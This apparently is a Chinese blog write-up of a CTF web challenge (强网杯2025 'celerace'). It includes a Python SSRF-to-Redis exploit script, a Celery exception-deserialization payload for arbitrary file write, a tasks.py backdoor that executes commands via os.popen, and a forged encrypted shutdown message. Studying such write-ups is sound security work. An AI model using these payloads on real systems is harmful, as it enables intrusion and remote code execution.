<span class="line">    <span class="token keyword">for</span> arg <span class="token keyword">in</span> args<span class="token punctuation">:</span></span>
<span class="line">        resp <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f&quot;$</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">\r\n</span><span class="token interpolation"><span class="token punctuation">{</span>arg<span class="token punctuation">}</span></span><span class="token string">\r\n&quot;</span></span></span>
<span class="line">    <span class="token keyword">return</span> resp <span class="token operator">+</span> <span class="token string">&quot;\r\n\r\n\r\n\r\n*3&quot;</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>verb<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token comment"># print(verb)</span></span>
<span class="line">    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span></span>
<span class="line">        url<span class="token operator">=</span>URL<span class="token operator">+</span> <span class="token string">&quot;/tasks/fetch/%2e%2e%2f%61&quot;</span><span class="token punctuation">,</span></span>
<span class="line">        json<span class="token operator">=</span><span class="token punctuation">{</span></span>
<span class="line">            <span class="token string">&quot;url&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;dict://127.0.0.1:6379/&quot;</span><span class="token punctuation">,</span></span>
<span class="line">            <span class="token string">&quot;verb&quot;</span><span class="token punctuation">:</span> verb</span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">)</span></span>
<span class="line">    task_id <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;task_id&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token comment"># print(task_id)</span></span>
<span class="line">    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span></span>
<span class="line">        url<span class="token operator">=</span>URL<span class="token operator">+</span> <span class="token string">&quot;/tasks/result&quot;</span><span class="token punctuation">,</span></span>
<span class="line">        params<span class="token operator">=</span><span class="token punctuation">{</span></span>
<span class="line">            <span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> task_id</span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">)</span></span>
<span class="line">    res <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;result&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;preview&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">return</span> res</span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></span>
<span class="line">        cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;redis-cli&gt; &quot;</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">&#39;exit&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;quit&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">break</span></span>
<span class="line">        resp_str <span class="token operator">=</span> to_resp<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span></span>
<span class="line">        res <span class="token operator">=</span> exp<span class="token punctuation">(</span>resp_str<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面为 redis 的利用脚本，可以执行 redis 命令。</p><h4 id="任意文件写入" tabindex="-1"><a class="header-anchor" href="#任意文件写入"><span>任意文件写入</span></a></h4><p>在<code>/framework/app.py</code>中我们可以找到一个类<code>DiagnosticsPersistError</code>,其中的方法<code>_maybe_persist</code>实现了文件写操作，并且可以通过payload制定写入文件的路径和内容，我们可以通过实例化该类实现任意写操作。</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">class</span> <span class="token class-name">DiagnosticsPersistError</span><span class="token punctuation">(</span>RuntimeError<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token triple-quoted-string string">&quot;&quot;&quot;Dormant exception used for development-time diagnostics persistence.&quot;&quot;&quot;</span></span>
<span class="line"></span>
<span class="line">    _BASE_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;FRAMEWORK_DIAGNOSTICS_DIR&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/app/data&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>resolve<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    _DEBUG_SENTINEL <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">&quot;/tmp/debug&quot;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">:</span> Any<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">:</span> Any<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_DEBUG_SENTINEL<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            self<span class="token punctuation">.</span>_maybe_persist<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></span>
<span class="line">        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">&quot;diagnostics capture failed&quot;</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中初始化中就调用了<code>_maybe_persist</code>，但是需要<code>/tmp/debug</code>文件存在，该问题我们可以通过上面的任意文件创建实现，现在的文件就是要如何实例化当前类。</p><p>该系统通过<code>celery</code>实现了 tasks 的异步执行和结果查看功能，但是 celery 存在一个 CVE 可以实现 RCE，但是该漏洞在<code>5.2.2</code>版本就被修复了，当前系统使用的版本为<code>5.3.6</code>，没有办法直接实现 RCE。</p><p>https://security.snyk.io/vuln/SNYK-PYTHON-CELERY-2314953</p><p>但是该漏洞的修复方法为限制实例化的对象范围，将可以实例化所有对象修改为只能实例化继承于<code>Exception</code>的类，恰好<code>DiagnosticsPersistError</code>继承<code>RuntimeError</code>,<code>RuntimeError</code>集成<code>Exception</code>，符合可以被实例化的条件。</p><p>其中实例化当前类的条件为可以任意修改 redis 中的值，这一条件我们通过权限绕过和 ssrf 进行了实现。</p><p>接下来我们就是了解实例化的详细逻辑，并且进行利用。</p><p>在上面连接中，payload 内容如下：</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span></span>
<span class="line">&#39;status&#39;<span class="token operator">:</span> &#39;FAILURE&#39;<span class="token punctuation">,</span></span>
<span class="line">&#39;result&#39;<span class="token operator">:</span> json.dumps(<span class="token punctuation">{</span></span>
<span class="line">  &#39;exc_module&#39;<span class="token operator">:</span> &#39;os&#39;<span class="token punctuation">,</span></span>
<span class="line">  &#39;exc_type&#39;<span class="token operator">:</span> &#39;system&#39;<span class="token punctuation">,</span></span>
<span class="line">  &#39;exc_message&#39;<span class="token operator">:</span> &#39;id&#39;</span>
<span class="line">  <span class="token punctuation">}</span>)</span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在当前系统中，celery 将内容存入 redis，我们查看内容如下：</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token property">&quot;status&quot;</span><span class="token operator">:</span> <span class="token string">&quot;SUCCESS&quot;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token property">&quot;result&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token property">&quot;echo&quot;</span><span class="token operator">:</span> <span class="token string">&quot;123123&quot;</span></span>
<span class="line">    <span class="token punctuation">}</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token property">&quot;traceback&quot;</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token property">&quot;children&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span></span>
<span class="line"></span>
<span class="line">    <span class="token punctuation">]</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token property">&quot;date_done&quot;</span><span class="token operator">:</span> <span class="token string">&quot;2025-11-10T08:54:02.435989&quot;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token property">&quot;task_id&quot;</span><span class="token operator">:</span> <span class="token string">&quot;42554953-c9cd-44b4-8017-fe6256498582&quot;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>按照上面的思路，我们可以通过 redis 修改指定 task 的结果，构造恶意 payload 实现调用<code>DiagnosticsPersistError</code>进而实现任意写。</p><h4 id="重启celery服务" tabindex="-1"><a class="header-anchor" href="#重启celery服务"><span>重启celery服务</span></a></h4><p>通过上面的任意写操作，我们就可以修改 <code>task.py</code>的源代码，嵌入恶意代码实现 RCE。</p><p>我选择修改<code>miniws.echo</code>使其直接读取并输出 flag 内容：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token decorator annotation punctuation">@celery_app<span class="token punctuation">.</span>task</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">&quot;miniws.echo&quot;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">echo_task</span><span class="token punctuation">(</span>message<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">&quot;echo&quot;</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">&quot;os&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 celery 服务由 supervisord 维持，所以我们只需要关闭 celery 服务就可以实现 celery 的重启。</p><p>celery 的消息中间件 Broker 可以通过 redis 的 PUB/SUB 发布并执行命令，所以我们现在可以通过该方法，实现 celery的重启。</p><p>Broker 和 redis 之间的通信通过 kombu 模块实现，但是该本题对传输的 body 进行了加密，其中加密算法相关在<code>/src/crypto.py</code>中实现。</p><p>由于 KEY 和 NONCE 固定，所以可以计算出密钥流。</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line">_TASK_KEY <span class="token operator">=</span> sha1<span class="token punctuation">(</span>settings<span class="token punctuation">.</span>secret_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span></span>
<span class="line">_TASK_NONCE <span class="token operator">=</span> md5<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>我们可以通过 ，我们执行如下 redis 命令，获取 Broker 的传输内容，进一步获取到加密的 body。</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line">LRANGE celery <span class="token number">0</span> <span class="token number">0</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>返回如下</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> lrange celery <span class="token number">0</span> <span class="token number">0</span></span>
<span class="line"><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">&quot;{<span class="token entity" title="\&quot;">\&quot;</span>body<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>QjPKTWsjxr7CEJ/yeT84esVrf8/1gxzY1ZLhQ90qjuR7lo/woRf1smsKoaNVdeqjvXkICIWwoCGvFDFuf8KNEF416pGtDb+TO1XGTwgnnKq3Rr+ZGkF4mwBARxt30fMEcG0LNX1rT7EekgUHwo60KIIQPwoauizLopQajLtPYUl4kpgZkRzs7kVoGh0=<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>content-encoding<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>binary<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>content-type<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>application/x-miniws<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>headers<span class="token entity" title="\&quot;">\&quot;</span>: {<span class="token entity" title="\&quot;">\&quot;</span>lang<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>py<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>task<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>miniws.echo<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>id<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>c88a4d3d-9854-4f19-a979-241e67986dd7<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>shadow<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>eta<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>expires<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>group<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>group_index<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>retries<span class="token entity" title="\&quot;">\&quot;</span>: 0, <span class="token entity" title="\&quot;">\&quot;</span>timelimit<span class="token entity" title="\&quot;">\&quot;</span>: [null, null], <span class="token entity" title="\&quot;">\&quot;</span>root_id<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>c88a4d3d-9854-4f19-a979-241e67986dd7<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>parent_id<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>argsrepr<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>()<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>kwargsrepr<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>{&#39;message&#39;: &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;}<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>origin<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>gen14@celerace<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>ignore_result<span class="token entity" title="\&quot;">\&quot;</span>: false, <span class="token entity" title="\&quot;">\&quot;</span>replaced_task_nesting<span class="token entity" title="\&quot;">\&quot;</span>: 0, <span class="token entity" title="\&quot;">\&quot;</span>stamped_headers<span class="token entity" title="\&quot;">\&quot;</span>: null, <span class="token entity" title="\&quot;">\&quot;</span>stamps<span class="token entity" title="\&quot;">\&quot;</span>: {}}, <span class="token entity" title="\&quot;">\&quot;</span>properties<span class="token entity" title="\&quot;">\&quot;</span>: {<span class="token entity" title="\&quot;">\&quot;</span>correlation_id<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>c88a4d3d-9854-4f19-a979-241e67986dd7<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>reply_to<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>5d4c36a8-3215-3828-91c1-4582985c0372<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>delivery_mode<span class="token entity" title="\&quot;">\&quot;</span>: 2, <span class="token entity" title="\&quot;">\&quot;</span>delivery_info<span class="token entity" title="\&quot;">\&quot;</span>: {<span class="token entity" title="\&quot;">\&quot;</span>exchange<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span><span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>routing_key<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>celery<span class="token entity" title="\&quot;">\&quot;</span>}, <span class="token entity" title="\&quot;">\&quot;</span>priority<span class="token entity" title="\&quot;">\&quot;</span>: 0, <span class="token entity" title="\&quot;">\&quot;</span>body_encoding<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>base64<span class="token entity" title="\&quot;">\&quot;</span>, <span class="token entity" title="\&quot;">\&quot;</span>delivery_tag<span class="token entity" title="\&quot;">\&quot;</span>: <span class="token entity" title="\&quot;">\&quot;</span>cd147f8d-bd85-487a-9412-3d20473e9f61<span class="token entity" title="\&quot;">\&quot;</span>}}&quot;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>其中我们拿到了加密的 body 之后就可以通过已知明文来获取 key stream。</p><blockquote><p>这里要注意，在后续如果想要加密一个很长的内容时候，我们已知明文要长一点，来确保有足够的 key stream 供后续加密使用，感觉 zhoumo 的帮助喵😭。</p></blockquote><p>之后我们拿到 key stream 之后就可以对关机相关 payload 加密：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line"><span class="token comment"># Payload</span></span>
<span class="line"><span class="token punctuation">{</span><span class="token string">&quot;method&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;shutdown&quot;</span>,<span class="token string">&quot;arguments&quot;</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"><span class="token comment"># Full Payload</span></span>
<span class="line">PUBLISH /0.celery.pidbox <span class="token string">&#39;{&quot;body&quot;: &quot;Ykr6BGRpxL+TWdzmdGh2PMt9cIy4wBzL04btR9I/nKcgjJPs&quot;, &quot;content-encoding&quot;: &quot;binary&quot;, &quot;content-type&quot;: &quot;application/x-miniws&quot;, &quot;headers&quot;: {&quot;clock&quot;: 1, &quot;expires&quot;: 1861891032.9756505}, &quot;properties&quot;: {&quot;delivery_mode&quot;: 2, &quot;delivery_info&quot;: {&quot;exchange&quot;: &quot;celery.pidbox&quot;, &quot;routing_key&quot;: &quot;&quot;}, &quot;priority&quot;: 0, &quot;body_encoding&quot;: &quot;base64&quot;, &quot;delivery_tag&quot;: &quot;e9cb2a03-3968-4a48-a3ea-ca7ba413c012&quot;}}&#39;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 body 为<code>{&quot;method&quot;:&quot;shutdown&quot;,&quot;arguments&quot;:{}}</code>加密之后的 base64 加密的结果。</p><p>我们通过 Redis 发送该 payload 就会关闭 celery 服务，但是 supervisord 重新拉起 celery 服务之后就会重新加载修改过的 <code>tasks.py</code>，之后我们就可以通过<code>miniws.echo</code>实现 RCE 获取到 flag。</p><h2 id="参考博客" tabindex="-1"><a class="header-anchor" href="#参考博客"><span>参考博客</span></a></h2><p>参考下面两位大佬的博客进行了复现，其中<code>dos.py</code>和修改后的<code>tasks.py</code>来自 zoiltin 师傅，<code>redis.py</code>来自 Potat0w0 师傅。</p><p>https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/</p><p>https://blog.potatowo.top/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bwp/</p></div><!--[--><!--]--></div><footer class="vp-page-meta"><!----><div class="vp-meta-item git-info"><div class="vp-meta-item last-updated"><span class="meta-item-label">Last Updated:: </span><time class="meta-item-info" datetime="2026-01-12T09:23:14.000Z" data-allow-mismatch>1/12/26, 9:23 AM</time></div><div class="vp-meta-item contributors"><span class="meta-item-label">Contributors: </span><span class="meta-item-info"><!--[--><!--[--><span class="contributor" title="email: bxgh6_xivkv71ra8@163.com">songsanggggg</span><!----><!--]--><!--]--></span></div></div></footer><!----><!--[--><!--]--></main><!--]--></div><!--[--><!----><!--]--><!--]--></div>
    <script type="module" src="/assets/app-Rshun_iY.js" defer></script>
  </body>
</html>
